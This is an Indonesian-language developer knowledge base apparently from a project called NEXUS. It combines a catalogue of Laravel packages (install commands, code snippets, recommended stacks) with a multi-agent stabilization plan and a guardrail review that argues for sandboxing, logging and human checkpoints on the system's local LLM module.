- Admin panel, SaaS, dashboard multi-role

---

---

## 5. Media & File Management

---

### 🟢 Spatie Laravel Media Library

| Detail | Info |
|---|---|
| **Package** | `spatie/laravel-medialibrary` |
| **Dibuat oleh** | Spatie |

**Kegunaan:**
Manajemen file/media yang powerful — upload file, attach ke model Eloquent, konversi otomatis (resize, crop, watermark), support disk (local, S3, R2, dll).

**Install:**
```bash
composer require spatie/laravel-medialibrary
php artisan vendor:publish --provider="Spatie\MediaLibrary\MediaLibraryServiceProvider" --tag="medialibrary-migrations"
php artisan migrate
```

**Setup Model:**
```php
use Spatie\MediaLibrary\HasMedia;
use Spatie\MediaLibrary\InteractsWithMedia;

class Product extends Model implements HasMedia
{
    use InteractsWithMedia;

    public function registerMediaCollections(): void
    {
        $this->addMediaCollection('images');
        $this->addMediaCollection('documents')->singleFile();
    }
}
```

**Penggunaan:**
```php
// Upload
$product->addMedia($request->file('image'))->toMediaCollection('images');

// Ambil
$product->getFirstMediaUrl('images');
$product->getMedia('images');
```

**Kapan pakai:**
- Project yang punya banyak upload file (foto produk, dokumen, avatar)
- Butuh resize/konversi otomatis
- Mau file terorganisir per model

---

### 🔵 Intervention Image

| Detail | Info |
|---|---|
| **Package** | `intervention/image` |
| **Versi** | v3.x |

**Kegunaan:**
Manipulasi gambar — resize, crop, rotate, filter, watermark, convert format. Biasanya dipakai bersamaan dengan Media Library untuk konversi otomatis.

**Install:**
```bash
composer require intervention/image
```

**Penggunaan:**
```php
use Intervention\Image\ImageManager;
use Intervention\Image\Drivers\Gd\Driver;

$manager = new ImageManager(new Driver());
$image = $manager->read('foto.jpg');
$image->resize(300, 200)->save('thumb.jpg');
```

---

---

## 6. Activity Log & Audit Trail

---

### 📋 Spatie Laravel Activity Log

| Detail | Info |
|---|---|
| **Package** | `spatie/laravel-activitylog` |
| **Dibuat oleh** | Spatie |

**Kegunaan:**
Mencatat semua aktivitas user di aplikasi — siapa yang create/update/delete model apa, kapan, dan apa yang berubah (before/after). Essential untuk audit trail.

**Install:**
```bash
composer require spatie/laravel-activitylog
php artisan vendor:publish --provider="Spatie\Activitylog\ActivitylogServiceProvider" --tag="activitylog-migrations"
php artisan migrate
```

**Setup Model (auto log):**
```php
use Spatie\Activitylog\Traits\LogsActivity;
use Spatie\Activitylog\LogOptions;

class Product extends Model
{
    use LogsActivity;

    public function getActivitylogOptions(): LogOptions
    {
        return LogOptions::defaults()
            ->logOnly(['name', 'price', 'is_active'])  // kolom yang dicatat
            ->logOnlyDirty();                           // hanya yang berubah
    }
}
```

**Log manual:**
```php
activity()
    ->causedBy($user)
    ->performedOn($product)
    ->log('updated price');
```

---

---

## 7. Settings & Configuration

---

### ⚙️ Spatie Laravel Settings

| Detail | Info |
|---|---|
| **Package** | `spatie/laravel-settings` |
| **Dibuat oleh** | Spatie |

**Kegunaan:**
Menyimpan settings aplikasi di database (bukan `.env`), dengan type-safety. Cocok untuk settings yang bisa diubah via admin panel — nama app, SMTP, toggle fitur, dll.

**Install:**
```bash
composer require spatie/laravel-settings
php artisan vendor:publish --provider="Spatie\LaravelSettings\LaravelSettingsServiceProvider" --tag="migrations"
php artisan migrate
```

**Buat Settings Class:**
```php
// php artisan make:settings GeneralSettings
use Spatie\LaravelSettings\Settings;

class GeneralSettings extends Settings
{
    public string $site_name;
    public string $site_tagline;
    public bool   $maintenance_mode;

    public static function group(): string
    {
        return 'general';
    }
}
```

**Pakai di mana saja:**
```php
$settings = app(GeneralSettings::class);
echo $settings->site_name;

$settings->site_name = 'Nama Baru';
$settings->save();
```

---

---

## 8. SEO & Metadata

---

### 🔍 Spatie Laravel Sitemap

| Detail | Info |
|---|---|
| **Package** | `spatie/laravel-sitemap` |
| **Dibuat oleh** | Spatie |

**Kegunaan:**
Generate sitemap XML otomatis dari route/model Laravel. Support multi-sitemap, image sitemap, news sitemap.

**Install:**
```bash
composer require spatie/laravel-sitemap
```

**Generate sitemap:**
```php
use Spatie\Sitemap\Sitemap;
use Spatie\Sitemap\Tags\Url;

Sitemap::create()
    ->add(Url::create('/'))
    ->add(Url::create('/about'))
    ->add(Post::all())   // kalau model implement toSitemapTag()
    ->writeToFile(public_path('sitemap.xml'));
```

---

### 🏷️ RalphJSmit Laravel SEO

| Detail | Info |
|---|---|
| **Package** | `ralphjsmit/laravel-seo` |

**Kegunaan:**
Manajemen meta tag SEO (title, description, OG tags, Twitter card, JSON-LD) per halaman/model. Terintegrasi dengan Filament.

**Install:**
```bash
composer require ralphjsmit/laravel-seo
php artisan vendor:publish --tag="seo-migrations"
php artisan migrate
```

---

---

## 9. Image Processing

---

### 🖼️ Spatie Image

| Detail | Info |
|---|---|
| **Package** | `spatie/image` |
| **Dibuat oleh** | Spatie |

**Kegunaan:**
Manipulasi gambar berbasis Intervention Image tapi dengan API yang lebih bersih dan terintegrasi baik dengan Media Library.

**Install:**
```bash
composer require spatie/image
```

---

---

## 10. PDF & Export

---

### 📄 DomPDF (Laravel Snappy / Barryvdh)

| Detail | Info |
|---|---|
| **Package** | `barryvdh/laravel-dompdf` |
| **Dibuat oleh** | Barry vd. Heuvel |

**Kegunaan:**
Generate PDF dari Blade view. Paling mudah di-setup, tapi kurang baik untuk layout kompleks dengan CSS modern.

**Install:**
```bash
composer require barryvdh/laravel-dompdf
```

**Penggunaan:**
```php
use Barryvdh\DomPDF\Facade\Pdf;

$pdf = Pdf::loadView('pdf.invoice', ['data' => $data]);
return $pdf->download('invoice.pdf');
```

---

### 📊 Maatwebsite Laravel Excel

| Detail | Info |
|---|---|
| **Package** | `maatwebsite/excel` |
| **Dibuat oleh** | Maatwebsite |

**Kegunaan:**
Import & export Excel/CSV dari/ke Laravel. Support collection, query builder, generator untuk data besar, event system.

**Install:**
```bash
composer require maatwebsite/excel
php artisan vendor:publish --provider="Maatwebsite\Excel\ExcelServiceProvider" --tag=config
```

**Export:**
```php
// php artisan make:export UsersExport --model=User
use Maatwebsite\Excel\Facades\Excel;

return Excel::download(new UsersExport, 'users.xlsx');
```

**Import:**
```php
// php artisan make:import UsersImport --model=User
Excel::import(new UsersImport, $request->file('file'));
```

---

---

## 11. Notification & Email

---

### 📧 Laravel Notification Channels

| Detail | Info |
|---|---|
| **Package** | Berbeda per channel |
| **Sumber** | [laravel-notification-channels.com](https://laravel-notification-channels.com) |

**Channel populer:**
```bash
# WhatsApp via Twilio
composer require laravel-notification-channels/twilio

# Telegram
composer require laravel-notification-channels/telegram

# Firebase Push Notification
composer require laravel-notification-channels/fcm

# Slack
composer require laravel-notification-channels/slack
```

---

### 📬 Spatie Laravel Mailcoach

| Detail | Info |
|---|---|
| **Package** | `spatie/laravel-mailcoach` |
| **Dibuat oleh** | Spatie |
| **Harga** | Freemium (self-hosted gratis, SaaS berbayar) |

**Kegunaan:**
Email marketing & newsletter platform yang bisa self-hosted di Laravel sendiri. List management, campaign, automation, analytics.

---

---

## 12. API & Utility

---

### 🔄 Laravel Telescope

| Detail | Info |
|---|---|
| **Package** | `laravel/telescope` |
| **Dibuat oleh** | Laravel Official |

**Kegunaan:**
Debug tool untuk development — monitor semua request, query, job, mail, notification, log, exception, dll via UI web. **Hanya untuk development.**

**Install:**
```bash
composer require laravel/telescope --dev
php artisan telescope:install
php artisan migrate
```

---

### 🔎 Laravel Debugbar

| Detail | Info |
|---|---|
| **Package** | `barryvdh/laravel-debugbar` |

**Kegunaan:**
Toolbar debug di browser — query count, query time, views yang diload, binding, dll. Sangat berguna untuk optimasi.

**Install:**
```bash
composer require barryvdh/laravel-debugbar --dev
```

---

### ⚡ Laravel Horizon

| Detail | Info |
|---|---|
| **Package** | `laravel/horizon` |
| **Requirement** | Redis |

**Kegunaan:**
Dashboard monitoring untuk queue/job Laravel yang pakai Redis driver. Lihat job pending, failed, throughput, waktu eksekusi.

**Install:**
```bash
composer require laravel/horizon
php artisan horizon:install
php artisan horizon
```

---

### 🔗 Laravel Socialite

| Detail | Info |
|---|---|
| **Package** | `laravel/socialite` |
| **Dibuat oleh** | Laravel Official |

**Kegunaan:**
OAuth login via provider eksternal — Google, Facebook, GitHub, Twitter, LinkedIn, dll.

**Install:**
```bash
composer require laravel/socialite
# Provider tambahan:
composer require socialiteproviders/google
```

---

### 🌐 Spatie Laravel Translatable

| Detail | Info |
|---|---|
| **Package** | `spatie/laravel-translatable` |

**Kegunaan:**
Multi-language support untuk model — simpan terjemahan di kolom JSON, akses dengan `$model->getTranslation('name', 'id')`.

**Install:**
```bash
composer require spatie/laravel-translatable
```

---

### 🔢 Spatie Laravel Query Builder

| Detail | Info |
|---|---|
| **Package** | `spatie/laravel-query-builder` |

**Kegunaan:**
Build Eloquent query dari request parameter — filter, sort, include relasi, semua via URL parameter. Sangat berguna untuk REST API.

**Install:**
```bash
composer require spatie/laravel-query-builder
```

**Contoh:**
```php
// GET /users?filter[name]=john&sort=-created_at&include=posts
$users = QueryBuilder::for(User::class)
    ->allowedFilters(['name', 'email'])
    ->allowedSorts(['name', 'created_at'])
    ->allowedIncludes(['posts'])
    ->paginate();
```

---

### 🗂️ Laravel Sluggable (Spatie)

| Detail | Info |
|---|---|
| **Package** | `spatie/laravel-sluggable` |

**Kegunaan:**
Auto-generate slug dari field model — `"Judul Artikel Ini"` → `"judul-artikel-ini"`. Support unique slug otomatis.

**Install:**
```bash
composer require spatie/laravel-sluggable
```

---

### 🔐 Spatie Laravel Backup

| Detail | Info |
|---|---|
| **Package** | `spatie/laravel-backup` |

**Kegunaan:**
Backup database + file ke berbagai storage (local, S3, Dropbox, dll). Bisa di-schedule otomatis. Support notifikasi kalau backup gagal.

**Install:**
```bash
composer require spatie/laravel-backup
php artisan vendor:publish --provider="Spatie\Backup\BackupServiceProvider"
```

**Jalankan:**
```bash
php artisan backup:run
php artisan backup:run --only-db   # hanya database
```

---

---

## 13. Testing

---

### 🧪 Pest PHP

| Detail | Info |
|---|---|
| **Package** | `pestphp/pest` |

**Kegunaan:**
Testing framework modern untuk PHP — syntax lebih bersih dari PHPUnit, support plugin (Coverage, Livewire, Faker, Stress, dll). Laravel 11+ sudah default Pest.

**Install:**
```bash
composer require pestphp/pest --dev --with-all-dependencies
php artisan pest:install

# Plugin:
composer require pestphp/pest-plugin-laravel --dev
composer require pestphp/pest-plugin-livewire --dev
```

**Contoh test:**
```php
it('can create a product', function () {
    $response = $this->post('/products', [
        'name'  => 'Test Product',
        'price' => 10000,
    ]);

    $response->assertRedirect('/products');
    $this->assertDatabaseHas('products', ['name' => 'Test Product']);
});
```

---

---

## 14. Development Tools

---

### 🛠️ Laravel IDE Helper

| Detail | Info |
|---|---|
| **Package** | `barryvdh/laravel-ide-helper` |

**Kegunaan:**
Generate file helper untuk IDE (PHPStorm, VS Code) agar autocomplete model, facade, dan method bekerja dengan benar.

**Install:**
```bash
composer require barryvdh/laravel-ide-helper --dev
php artisan ide-helper:generate     # facade
php artisan ide-helper:models       # model
php artisan ide-helper:eloquent     # eloquent builder
```

---

### 🎨 Laravel Pint

| Detail | Info |
|---|---|
| **Package** | `laravel/pint` |
| **Dibuat oleh** | Laravel Official |

**Kegunaan:**
Code style fixer otomatis berbasis PHP-CS-Fixer. Sudah include di Laravel 9+. Jalankan untuk format ulang kode sesuai standar.

**Jalankan:**
```bash
./vendor/bin/pint
./vendor/bin/pint --dirty    # hanya file yang berubah
```

---

---

## 15. Tabel Perbandingan Cepat

| Package | Vendor | Harga | Kegunaan Utama |
|---|---|---|---|
| Livewire | Caleb Porzio | Gratis | UI interaktif tanpa JS |
| Alpine.js | Caleb Porzio | Gratis | Interaksi UI ringan |
| Inertia.js | Jonathan Reinink | Gratis | SPA dengan backend Laravel |
| Tailwind CSS | Tailwind Labs | Gratis | Utility-first CSS |
| Breeze | Laravel | Gratis | Auth starter kit minimal |
| Jetstream | Laravel | Gratis | Auth starter kit lengkap + teams |
| Sanctum | Laravel | Gratis | Auth API / SPA ringan |
| Passport | Laravel | Gratis | OAuth 2.0 server penuh |
| Filament | Dan Harrin | Gratis | Admin panel TALL Stack |
| Nova | Laravel | **Berbayar** | Admin panel official |
| Spatie Permission | Spatie | Gratis | Role & permission |
| Spatie Media Library | Spatie | Gratis | Upload & manajemen file |
| Spatie Activity Log | Spatie | Gratis | Audit trail |
| Spatie Settings | Spatie | Gratis | Settings di database |
| Spatie Backup | Spatie | Gratis | Backup DB & file |
| Spatie Sitemap | Spatie | Gratis | Generate sitemap XML |
| Spatie Query Builder | Spatie | Gratis | Filter/sort API via URL |
| Spatie Sluggable | Spatie | Gratis | Auto-generate slug |
| Spatie Translatable | Spatie | Gratis | Multi-language model |
| Barryvdh DomPDF | Barry vd. Heuvel | Gratis | Generate PDF |
| Maatwebsite Excel | Maatwebsite | Gratis | Import/export Excel |
| Intervention Image | Oliver Vogel | Gratis | Manipulasi gambar |
| Telescope | Laravel | Gratis | Debug tool (dev only) |
| Debugbar | Barry vd. Heuvel | Gratis | Debug toolbar (dev only) |
| Horizon | Laravel | Gratis | Queue dashboard (Redis) |
| Socialite | Laravel | Gratis | OAuth login (Google, dll) |
| Pest PHP | Pest | Gratis | Testing modern |
| Pint | Laravel | Gratis | Code style fixer |
| IDE Helper | Barry vd. Heuvel | Gratis | Autocomplete IDE |

---

## 16. Stack Rekomendasi per Jenis Project

---

### 🏢 Admin Panel / Dashboard Internal

```
Laravel + Filament + Spatie Permission + Spatie Activity Log + Spatie Media Library
```

---

### 🛒 E-Commerce / Toko Online

```
Laravel + Livewire + Alpine.js + Tailwind
+ Spatie Media Library (foto produk)
+ Spatie Permission (admin/customer/staff)
+ Maatwebsite Excel (export order)
+ DomPDF (cetak invoice)
+ Spatie Backup
```

---

### 🔌 REST API (Mobile App / Frontend SPA)

```
Laravel + Sanctum (auth) + Spatie Query Builder
+ Spatie Permission + Spatie Media Library
+ Telescope (dev)
```

---

### 🏗️ SaaS Multi-Tenant

```
Laravel + Jetstream (--teams) + Inertia + Vue/React
+ Spatie Permission + Spatie Settings
+ Horizon (queue) + Spatie Backup
+ Socialite (OAuth login)
```

---

### 📰 Blog / CMS

```
Laravel + Filament (editor) + Livewire (frontend)
+ Spatie Media Library + Spatie Sluggable
+ Spatie Sitemap + Spatie Translatable (kalau multi-bahasa)
```

---

### 🧪 NEXUS AI — Autonomous TALL Stack Generator

```
Laravel + Livewire + Alpine.js + Tailwind (target sandbox)
+ Filament (admin monitoring)
+ Spatie Permission + Spatie Activity Log
+ Spatie Media Library + Pest PHP
```

---

> 📌 **Prinsip pemilihan package:**
> Pilih yang paling minimal untuk kebutuhan yang ada.
> Jangan install yang tidak dipakai — setiap package adalah dependency baru yang harus di-maintain.

---

*Dokumen ini bagian dari NEXUS Rules — TALL Stack Standards*


---
> **METADATA (NEXUS SEMANTIC TAGS)**: [security, database, ui-ux, performance, tdd, vcs, saas, api]

### 📘 KNOWLEDGE: NEXUS_MULTI_AGENT_STABILIZATION_PLAN.MD

# NEXUS — Multi-Agent Stabilization Plan
> **VERSION**: v2 | **Last Updated**: 26/05/2026


## Final Output Planning (Loop Scan Result)

> **Target Akhir:** Stable Multi-Agent Framework
> **Bukan:** AGI / Autonomous Intelligence / Self-Evolving System
> **Tanggal Scan:** 2026-05-07

---

## Scan Result Summary

| Area | Status Saat Ini | Gap |
| ---- | -------------- | --- |
| Core Engine (NexusEngine.js) | Ada, berfungsi | Direct invocation, belum Event Bus |
| Contract System | Ada (2 kontrak) | Belum Universal Task Protocol |
| Memory Layer | long_term / short_term | Belum granular (raw/normalized/semantic) |
| Agent Workflows | Folder kosong | Belum ada agent workflow terdefinisi |
| Logging | Tidak ada logs/ folder | Belum observability standard |
| Plugin/Scanner | Ada di agent/tools/ | Belum ada sandbox isolation |
| Orchestration | NexusEngine langsung calls tools | Belum ada event-driven layer |
| Agent Isolation | Mixed (engine = orchestrator + runner) | Belum strict boundary |

---

# PHASE 1 — Agent Contract & Isolation

> **Tujuan:** Setiap agent memiliki boundary yang jelas dan kontrak yang ketat.

## 1.1 Universal Task Protocol

Buat `agent/core/TaskProtocol.js` sebagai standar komunikasi universal:

```json
{
  "task_id": "UUID",
  "agent": "agent_name",
  "priority": "low | normal | high | critical",
  "input": {},
  "context": {},
  "status": "pending | running | done | failed",
  "timestamp": "ISO8601",
  "timeout_ms": 30000
}
```

**File yang perlu dibuat:**
- `agent/core/TaskProtocol.js` — definisi dan validator protokol
- Update semua scanner di `agent/tools/scanners/` untuk menggunakan protokol ini

---

## 1.2 Agent Boundary Enforcement

Setiap agent di `agent/tools/` wajib memiliki manifest:

```json
{
  "name": "cyber-security",
  "responsibility": "Scan keamanan dan autentikasi",
  "allowed_inputs": ["targetPath"],
  "allowed_outputs": ["findings[]"],
  "permissions": ["read_files"],
  "execution_scope": "agent/tools/scanners/",
  "timeout_ms": 30000
}
```

**File yang perlu dibuat:**
- `agent/tools/scanners/manifest.json` — manifest untuk semua scanner
- `agent/tools/manifest.json` — manifest untuk semua tools

---

## 1.3 Agent Role Isolation (Pisahkan NexusEngine)

Saat ini `NexusEngine.js` merangkap: Orchestrator + Runner + Memory + Logging.
Ini melanggar Single Responsibility Principle.

**Pemisahan yang diperlukan:**

```text
agent/core/
├── NexusEngine.js        → HANYA Lifecycle Controller (audit → plan → execute → verify)
├── Orchestrator.js       → Baru: Koordinasi antar agent, routing task
├── Contract.js           → Existing: Kontrak data (perlu diperluas)
├── TaskProtocol.js       → Baru: Universal task schema & validator
├── MemoryPipeline.js     → Existing: OK, tapi perlu event hooks
├── Machinist.js          → Existing: Forge/build capability
└── Distiller.js          → Existing: Knowledge distillation
```

---

# PHASE 2 — Memory Governance

> **Tujuan:** Memory menjadi single source of truth dengan konsistensi penuh.

## 2.1 Restrukturisasi Memory Folder

Ubah dari:
```text
memory/
├── long_term/
└── short_term/
```

Menjadi:
```text
memory/
├── raw/          ← input mentah, belum diproses
├── normalized/   ← data yang sudah dibersihkan & diformat
├── semantic/     ← index semantik berdasarkan tag
├── distilled/    ← knowledge final yang sudah diverifikasi (pindah dari long_term)
├── operational/  ← data kerja aktif (pindah dari short_term)
└── archived/     ← history lama (SESSION_HISTORY_ARCHIVE)
```

**Catatan:** `memory/long_term/` (berisi NEXUS_HUB_INDEX.md) → pindah ke `memory/distilled/`

---

## 2.2 Memory Validation Layer

Tambahkan validasi wajib sebelum data masuk ke memori:

**Fitur yang harus ada:**
- Checksum validation (hash setiap file untuk deteksi perubahan)
- Versioning (setiap update memiliki nomor versi)
- Conflict detection (cegah duplicate semantic yang bertentangan)
- Rollback support (bisa kembali ke versi sebelumnya)
- Memory audit logs (setiap mutasi memori tercatat)

**File yang perlu dibuat:**
- `agent/core/MemoryGovernor.js` — layer validasi memori

---

## 2.3 Selesaikan Collision di Workflow

`workflow/internal/nexus-pipeline.md` masih memiliki konflik `IF { } ELSE { }` yang belum diselesaikan.

**Aksi:** Merge kedua opsi menjadi satu dokumen final yang bersih.

---

# PHASE 3 — Orchestration Hardening

> **Tujuan:** Orkestrasi deterministik, tidak ada direct coupling antar agent.

## 3.1 Event Bus Architecture

Ganti direct invocation di `NexusEngine.js` dengan event-driven pattern:

```text
SEBELUM:
NexusEngine → langsung panggil SchemaGuard, QueryOptimizer, Scanner

SESUDAH:
NexusEngine → emit event → EventBus → route ke agent yang tepat
```

**Event yang didefinisikan:**

```text
AUDIT_REQUESTED
AGENT_TASK_ASSIGNED
AGENT_TASK_COMPLETED
AGENT_TASK_FAILED
MEMORY_UPDATE_REQUESTED
SCANNER_TRIGGERED
SCANNER_FINISHED
PLAN_GENERATED
EXECUTION_STARTED
EXECUTION_COMPLETED
CYCLE_FINISHED
```

**File yang perlu dibuat:**
- `agent/core/EventBus.js` — publisher/subscriber sederhana
- Update `NexusEngine.js` untuk emit event, bukan direct call

---

## 3.2 Retry Logic & Failure Handling

Setiap agent execution wajib memiliki:

```text
- timeout (sudah ada di beberapa tempat, perlu distandarisasi)
- max retry: 3x
- fallback action saat gagal (log + skip vs halt)
- crash isolation (1 agent gagal tidak crash seluruh cycle)
```

---

## 3.3 Pengisian Agent Workflows

Folder `agent/workflows/internal/` dan `agent/workflows/external/` **kosong**.

**Isi yang perlu dibuat:**

```text
agent/workflows/internal/
├── audit-[workflow.md](../standards/NEXUS_WORKFLOW.MD)       ← alur audit standar
├── planning-[workflow.md](../standards/NEXUS_WORKFLOW.MD)    ← alur planning dari audit result
└── execution-[workflow.md](../standards/NEXUS_WORKFLOW.MD)   ← alur eksekusi task

agent/workflows/external/
├── harvest-[workflow.md](../standards/NEXUS_WORKFLOW.MD)     ← alur harvest dari external project
└── distribution-[workflow.md](../standards/NEXUS_WORKFLOW.MD) ← alur distribusi hasil
```

---

# PHASE 4 — Plugin & Scanner Isolation

> **Tujuan:** Scanner dan plugin tidak bisa merusak core system.

## 4.1 Plugin Manifest System

Setiap scanner di `agent/tools/scanners/` wajib memiliki manifest:

```json
{
  "name": "cyber-security",
  "version": "1.0.0",
  "permissions": ["read_files"],
  "entrypoint": "cyber-security.js",
  "execution_timeout": 30000,
  "output_schema": "findings[]"
}
```

**File yang perlu dibuat:**
- `agent/tools/scanners/manifest.json`

---

## 4.2 Execution Sandbox

Scanner dan forged tools WAJIB dijalankan dalam execution context yang terisolasi.

**Aturan ketat:**
- Scanner tidak boleh menulis ke `agent/core/`
- Scanner tidak boleh memodifikasi `memory/distilled/`
- Scanner tidak boleh self-register permission baru
- Output scanner HANYA boleh berupa `findings[]` array

**File yang perlu dibuat:**
- `agent/core/SandboxExecutor.js` — wrapper eksekusi terisolasi

---

# PHASE 5 — Logging & Observability

> **Tujuan:** Setiap event dan mutasi sistem tercatat dengan standar yang konsisten.

## 5.1 Dedicated Logging Structure

Buat folder logs/ yang terdedikasi:

```text
logs/
├── agents/         ← log per agent execution
├── orchestration/  ← log siklus orchestration
├── memory/         ← log mutasi memori
├── scanners/       ← log hasil scanner
├── plugins/        ← log forged plugin execution
└── errors/         ← centralized error log
```

---

## 5.2 Mandatory Log Fields

Setiap log entry wajib memiliki:

```json
{
  "timestamp": "ISO8601",
  "level": "INFO | WARNING | ERROR | CRITICAL",
  "agent": "agent_name",
  "task_id": "UUID",
  "duration_ms": 0,
  "event": "event_name",
  "message": "human readable",
  "metadata": {}
}
```

**File yang perlu dibuat:**
- `agent/core/Logger.js` — centralized logger dengan struktur standar

---

# PHASE 6 — Core vs Capability Split

> **Tujuan:** Pemisahan tegas antara sistem inti yang protected dan lapisan kapabilitas yang extensible.

## 6.1 Pembagian Zona

```text
CORE (protected — tidak boleh dimodifikasi oleh forged tools):
agent/core/
├── NexusEngine.js
├── Orchestrator.js       ← baru
├── EventBus.js           ← baru
├── Contract.js
├── TaskProtocol.js       ← baru
├── MemoryGovernor.js     ← baru
├── SandboxExecutor.js    ← baru
├── Logger.js             ← baru
└── MemoryPipeline.js

CAPABILITY LAYER (extensible — boleh ditambah/dimodifikasi):
agent/tools/
├── scanners/
└── [tool files]
```

---

# Urutan Implementasi (Priority Order)

```text
URGENT (Phase 1 & 5 dulu):
1. TaskProtocol.js          ← foundation komunikasi antar agent
2. Logger.js                ← observability sebelum apapun dieksekusi
3. logs/ folder structure   ← tempat log ditulis

PENTING (Phase 2 & 3):
4. MemoryGovernor.js        ← stabilkan memori sebelum scale
5. EventBus.js              ← decoupling orchestration
6. Restrukturisasi memory/  ← folder governance
7. Selesaikan collision di nexus-pipeline.md

PELENGKAP (Phase 4 & 6):
8. SandboxExecutor.js       ← keamanan plugin
9. manifest.json scanner    ← deklarasi permission
10. Isi agent/workflows/    ← dokumentasi alur kerja
```

---

# Definition of Done — "Multi-Agent Stabil"

Sistem dianggap **STABIL** jika semua kondisi ini terpenuhi:

```text
✅ Setiap agent memiliki contract yang jelas (input/output/permission)
✅ Semua komunikasi antar agent melalui TaskProtocol
✅ Orchestrator tidak memanggil agent secara langsung (via EventBus)
✅ Memory memiliki validasi dan versioning
✅ Setiap eksekusi tercatat di logs/ dengan format standar
✅ Scanner tidak bisa merusak core system (sandbox)
✅ 1 agent gagal tidak menghentikan seluruh cycle
✅ Semua agent workflow terdokumentasi di agent/workflows/
```

---

# Final Technical Positioning

```text
NEXUS = Modular Semantic Multi-Agent Framework
Target: Stable Multi-Agent Orchestration
Bukan: AGI / Autonomous Runtime / Self-Evolving System
```

---

*Generated via Loop Scan | Scan Date: 2026-05-07 | Version: 1.0*


---
> **METADATA (NEXUS SEMANTIC TAGS)**: [security, database, ui-ux, performance, vcs, api]

### 📘 KNOWLEDGE: NEXUS_NEXUS REVIEW GUARD RAILS.MD

# 🔍 NEXUS AI — Full Scan, Review & Multi-Agent Guardrail
> **VERSION**: v1 | **Last Updated**: 26/05/2026



> **Reviewer**: Senior AI Engineer Analysis  
> **Tanggal**: 2026-05-13  
> **Versi Engine**: v3.2.0  
> **Status**: ACTIONABLE

---

## BAGIAN 1 — SCAN HASIL (Apa Yang Berubah)

### Module Baru Yang Ditemukan

| Module                 | Fungsi                                          | Status                            |
| :--------------------- | :---------------------------------------------- | :-------------------------------- |
| `LocalIntelligence.js` | Integrasi Ollama untuk local LLM reasoning      | ✅ Ada, ⚠️ Perlu guardrail        |
| `RedisMemory.js`       | High-speed in-memory cache, singleton           | ✅ Solid                          |
| `Contract.js`          | Data contracts: AuditReport, ImplementationPlan | ✅ Sangat bagus                   |
| `TaskProtocol.js`      | Standarisasi task antar agent dengan trace_id   | ✅ Production-grade               |
| `WorktreeManager.js`   | Git worktree isolation per feature              | ⚠️ Git commands masih di-comment  |
| `LaravelArchitect.js`  | Otomatis inject trait, tambah migration column  | ✅ Useful, scope terbatas         |
| `SemanticEngine.js`    | TF-IDF vector search + Redis cache              | ✅ Implementasi dari upgrade plan |

### Yang Sudah Diperbaiki dari Versi Sebelumnya

- ✅ `SemanticEngine.js` sudah diimplementasi dan terhubung ke `RedisMemory`
- ✅ `Contract.js` memberikan type safety antar modul
- ✅ `TaskProtocol.js` menambah `trace_id` dan `correlation_id` — observability naik level
- ✅ `Orchestrator.js` sekarang pakai `TaskProtocol` — task lifecycle terlacak
- ✅ Boundary docs sudah ada: `NEXUS INTERNAL CORE HARD BOUNDARY` dan `NEXUS eksternal boundary`

---

## BAGIAN 2 — REVIEW KUALITAS

### 2.1 Yang Benar-Benar Kuat

**`Contract.js` — ini game changer**

```javascript
static validate(data) {
    const required = ['id', 'target', 'findings'];
    const missing = required.filter(field => !data[field]);
    if (missing.length > 0) throw new Error(`Contract Violation: Missing fields [${missing.join(', ')}]`);
}
```

Dengan adanya Contract, antar module sekarang punya formal interface. Ini yang membedakan sistem amatir dengan sistem yang bisa di-maintain jangka panjang.

---

**`TaskProtocol.js` — multi-agent communication standard**

```javascript
this.trace_id = `TRACE-${Date.now()}-${Math.random().toString(36).slice(2, 7)}`;
this.correlation_id = context.correlation_id || this.trace_id;
```

`trace_id` + `correlation_id` ini pola enterprise. Kalau ada task gagal di agent ke-7, lu bisa trace balik ke asal task-nya. Ini critical untuk debugging multi-agent.

---

**`RedisMemory.js` — graceful degradation**

```javascript
} catch (e) {
    console.warn('⚠️ Redis: Connection failed. Falling back to file-based memory.');
    this.isConnected = false;
}
```

Pattern ini benar — kalau Redis tidak ada, sistem tetap jalan. Tidak crash. Ini defensive engineering yang matang.

---

### 2.2 Yang Perlu Perhatian

**`WorktreeManager.js` — semua logic masih di-comment**

```javascript
// execSync(`git worktree add -b feature/${featureName} ${targetPath} main`, ...);
// execSync(`git checkout main && git merge feature/${featureName}`, ...);
```

Modul ini ada tapi tidak aktif. Kalau dipanggil sekarang, tidak akan melakukan apa-apa. Ini bisa menyesatkan karena log-nya bilang "merging" padahal tidak.

**Rekomendasi**: Tambahkan flag `this.isActive = false` dan guard di setiap method, atau hapus dulu sampai siap diaktifkan.

---

**`LocalIntelligence.js` — autonomous reasoning tanpa batas**

```javascript
async generate(prompt, systemPrompt = "You are Nexus AI, a senior software architect.") {
    // ...
    const response = await axios.post(`${this.baseUrl}/generate`, {
        model: this.model,
        prompt: prompt,
        stream: false,
        options: { temperature: 0.2, num_ctx: 4096 }
    });
    return response.data.response;
}
```

Modul ini memberi NEXUS kemampuan untuk **reason secara bebas** via local LLM. Tidak ada scope limit, tidak ada output validation, tidak ada human checkpoint. Ini adalah pintu menuju arah AGI yang perlu dibatasi (lihat Bagian 3).

---

**`[alur agi.md](../other/NEXUS_ALUR AGI.MD)` — diagram yang menjadi concern**

```
A[LLM] --> B[Agent] --> C[AGI]
```

Diagram ini memetakan AGI sebagai target evolution NEXUS. Ini perlu direvisi dengan pagar yang jelas di mana NEXUS **harus berhenti**.

---

### 2.3 Inkonsistensi Yang Ditemukan

| Masalah                                                        | Lokasi                     | Dampak                 |
| :------------------------------------------------------------- | :------------------------- | :--------------------- |
| `WorktreeManager` aktif tapi tidak fungsional                  | WorktreeManager.js         | ⚠️ Misleading          |
| `LocalIntelligence` tidak punya output schema                  | LocalIntelligence.js       | 🔴 Uncontrolled output |
| `[alur agi.md](../other/NEXUS_ALUR AGI.MD)` memetakan AGI sebagai endpoint                   | documentation/mermaid/     | ⚠️ Directional risk    |
| `[RECURSIVE_EVOLUTION_ARCHITECT.md](../other/NEXUS_RECURSIVE_EVOLUTION_ARCHITECT.MD)` pakai kata "infinite loop"  | documentation/nexus_rules/ | ⚠️ Framing risk        |
| `SemanticEngine` tidak di-import di `NexusEngine.js` yang baru | agent/core/                | 🔴 Dead code           |

---

## BAGIAN 3 — GUARDRAIL: PAGAR MULTI-AGENT

Ini adalah dokumen pagar resmi yang harus dijadikan bagian dari `NEXUS INTERNAL CORE`.

---

### 🗺️ Posisi Target NEXUS Yang Benar

```
LLM → Tool Agent → Workflow Agent → [NEXUS: Multi-Agent Framework] → ⛔ BERHENTI DI SINI
                                                                      ↓
                                                           Autonomous Runtime → AGI
```

